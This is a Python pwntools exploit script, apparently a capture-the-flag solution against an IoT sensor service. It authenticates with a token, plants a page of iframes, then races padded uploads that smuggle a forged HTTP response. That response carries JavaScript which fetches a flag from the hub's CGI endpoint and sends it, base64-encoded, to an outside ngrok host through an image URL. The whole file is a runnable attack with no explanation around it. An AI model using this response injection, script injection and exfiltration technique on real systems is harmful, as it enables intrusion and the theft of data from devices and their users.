import os
import time

import pwn
# pwn.context.log_level = 'debug'

def upload(r, name, contents):
	r.send(name)
	r.send(b'\n')
	r.send(str(len(contents)))
	r.send(b'\n')
	r.send(contents)
	assert(r.recvline() == b'ok\n')

HOST = '127.0.0.1:10000'
FRAMES = '\n'.join('<iframe src="http://{}/data/snapshot/bop?a={}"></iframe>'.format(HOST, i) for i in range(100))

PAYLOAD_JS = '<html><body><script>fetch("http://iot.hub/cgi-bin/flag").then(r=>r.text()).then(f=>document.firstElementChild.innerHTML="<img src=http://3a42e4d82a22.ngrok.io/b64/"+ btoa(f)+">");alert(document.location)</script></body></html>'
PAYLOAD_A = 'Z' * 1448
PAYLOAD_B = PAYLOAD_A + f'\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(PAYLOAD_JS)}\r\n\r\n{PAYLOAD_JS}'

def main():
	r = pwn.remote(os.environ['TARGET_IP'], int(os.environ['SENSOR_PORT']))

	assert(r.recvline() == b'token\n')
	r.send(os.environ['SENSOR_TOKEN'] + '\n')
	assert(r.recvline() == b'ok\n')

	upload(r, 'frames', FRAMES)

	pcur, pnext = PAYLOAD_A, PAYLOAD_B
	while True:
		upload(r, 'bop', pcur)
		time.sleep(0.001)
		print(len(pcur))
		pcur, pnext = pnext, pcur


	r.interactive()

if __name__ == '__main__':
	main()
